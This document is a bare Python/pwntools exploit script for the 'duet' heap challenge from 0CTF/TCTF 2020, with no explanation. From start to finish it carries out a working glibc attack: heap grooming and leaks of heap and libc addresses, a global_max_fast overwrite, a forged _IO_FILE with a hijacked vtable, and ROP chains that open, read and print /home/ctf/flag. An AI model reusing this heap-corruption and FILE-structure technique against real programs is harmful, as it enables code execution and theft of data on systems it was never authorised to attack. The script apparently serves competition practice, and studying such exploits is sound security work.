# duet - 0CTF/TCTF 2020

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from IO_FILE import *
from time import sleep

###Utils
def newins(instrument,data):
	io.sendlineafter(': ','1')
	io.sendlineafter('Instrument: ',instrument)
	io.sendlineafter('Duration: ',str(len(data)))
	io.sendafter('Score: ',data)

def deleteins(instrument):
	io.sendlineafter(': ','2')
	io.sendlineafter('Instrument: ',instrument)

def showins(instrument):
	io.sendlineafter(': ','3')
	io.sendlineafter('Instrument: ',instrument)
	data = io.recvline().strip()
	return data[5:]

def fuckit(size):
	io.sendlineafter(': ','5')
	io.sendlineafter('合: ',str(size))

####Addr
main_arena = 0x3b2c40
unsorted_bin_offset = main_arena + 0x60
small_bin_offset = 0x3b2d80
global_max_fast = 0x3b4920
_IO_2_1_stdout_ = 0x3b3760
_IO_wide_data_1 = 0x3b28c0
_IO_file_jumps = 0x3af360
_IO_str_jumps = 0x3af420
_IO_list_all = 0x3b3660
_IO_wfile_sync = 0x3aee80

####Gadgets
L_leave_ret = 0x00100580
L_pop_rdi = 0x0012a20e
L_pop_rsi = 0x001223be
L_pop_rdx = 0x000ffa25
L_pop_rax = 0x00037bf8
L_syscall = 0x000e44e5

####Exploit
if __name__=='__main__':
	io = process('./duet_repeat')#env={'LD_PRELOAD':'./libc.so.6')
	dick = ['琴','瑟']
	for i in xrange(7):
		newins(dick[0],'A'*0x88)
		deleteins(dick[0])
		newins(dick[0],'A'*0xe8)
		deleteins(dick[0])
		newins(dick[0],'A'*0x1e8)
		deleteins(dick[0])
		newins(dick[0],'A'*0xd8)
		deleteins(dick[0])
		newins(dick[0],'A'*0x3e8)
		deleteins(dick[0])
		newins(dick[0],'A'*0x108)
		deleteins(dick[0])
		newins(dick[0],'A'*0x3d8)
		deleteins(dick[0])
		newins(dick[0],'A'*0x128)
		deleteins(dick[0])

	newins(dick[0],'A'*0x88)
	newins(dick[1],'A'*0x108)
	deleteins(dick[0])
	newins(dick[0],b'A'*0xd8+p64(0x131)+p64(0x0)+p64(0x121)+p64(0x0)+p64(0x111)+p64(0xf0)+p64(0x101)+b'A'*(0x1d8-0xe0))
	fuckit(0xf1)
	deleteins(dick[1])
	newins(dick[1],b'A'*0x108+p64(0xf1)+p64(0x0)*3)
	deleteins(dick[0])
	leaks = showins(dick[1])
	heap_base = u64(leaks[0x110:0x118])-0x68b0
	unsorted_bin = u64(leaks[0x118:0x120])
	libc_base = unsorted_bin - unsorted_bin_offset
	print(f'Heap: 0x{heap_base:02x}')
	print(f'Libc: 0x{libc_base:02x}')

	deleteins(dick[1])
	newins(dick[1],b'A'*0x108+p64(0xf1)+p64(libc_base+small_bin_offset)+p64(libc_base+small_bin_offset))
	newins(dick[0],'A'*0x108)
	deleteins(dick[0])
	newins(dick[0],
		p64(0)+p64(0)+p64(0)+p64(0xc1)+\
		p64(libc_base+small_bin_offset-0x30)+p64(heap_base+0x68c0)+\
		p64(heap_base+0x68b0)+p64(heap_base+0x68d0)+\
		p64(0)+p64(heap_base+0x68e0)+\
		p64(0)+p64(heap_base+0x68f0)+\
		p64(0)+p64(heap_base+0x6900)+\
		p64(0)+p64(heap_base+0x6910)+\
		p64(0)+p64(heap_base+0x6920)+\
		p64(0)+p64(libc_base+global_max_fast-0x10)+\
		b'A'*0x30+p64(0xc0)+p64(0x130))
	deleteins(dick[0])
	newins(dick[0],'A'*0xb8)

	deleteins(dick[1])
	newins(dick[1],b'A'*0x18+p64(0xe1)+b'A'*0xb0+p64(0xc0)+p64(0x130))
	deleteins(dick[0])
	deleteins(dick[1])
	IO_file = IO_FILE_plus(arch=64)
	stream = IO_file.construct(
				read_ptr=1,
				read_end=0,
				buf_base=0,
				buf_end=heap_base+0x1e100,
				read_base=0x7f7f7f7f7f7f7f7f,
				write_base=libc_base+L_leave_ret,
				codecvt=heap_base+0x68c0,
				wide_data=heap_base+0x6790,
				lock=(libc_base+_IO_list_all)-0x8,
				vtable=(libc_base+_IO_wfile_sync-0x38))
	stream += p64(libc_base)
	newins(dick[1],stream+b'A'*0x20+p64(0xf1)+p64(libc_base+_IO_2_1_stdout_+0x8f)+p64(0x0)*2)
	deleteins(dick[1])

	R_ROP = p64(0)+p64(libc_base+L_pop_rdi)+p64(0)+\
		p64(libc_base+L_pop_rdi)+p64(libc_base+L_leave_ret)+\
		p64(libc_base+L_pop_rdi)+p64(0x0)+\
		p64(libc_base+L_pop_rsi)+p64(heap_base+0x6930)+\
		p64(libc_base+L_pop_rdx)+p64(0x100)+\
		p64(libc_base+L_pop_rax)+p64(0x0)+\
		p64(libc_base+L_syscall)
	newins(dick[1],b'A'*0x18+p64(0xe1)+R_ROP.ljust(0xb0,b'\x00')+p64(0xc0)+p64(0x130))

	newins(dick[0],
		(b'A'+p64(libc_base+_IO_wide_data_1)+\
		p64(0)*3+p64(0xffffffff)+\
		p64(0)+p64(libc_base+_IO_file_jumps)+\
		p64(0)*2+p64(heap_base+0x6790)).ljust(0xe8,b'\x00'))
	sleep(0.2)

	L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base+0x69f0)+\
		p64(libc_base+L_pop_rsi)+p64(0x0)+\
		p64(libc_base+L_pop_rax)+p64(0x2)+\
		p64(libc_base+L_syscall)+\
		p64(libc_base+L_pop_rdi)+p64(0x3)+\
		p64(libc_base+L_pop_rsi)+p64(heap_base+0x69f0)+\
		p64(libc_base+L_pop_rdx)+p64(0x50)+\
		p64(libc_base+L_pop_rax)+p64(0x0)+\
		p64(libc_base+L_syscall)+\
		p64(libc_base+L_pop_rdi)+p64(0x1)+\
		p64(libc_base+L_pop_rax)+p64(0x1)+\
		p64(libc_base+L_syscall)+\
		p64(libc_base+L_pop_rax)+p64(0x3c)+\
		p64(libc_base+L_syscall)+\
		b'/home/ctf/flag\x00'
	io.send(L_ROP)
	io.interactive()
```
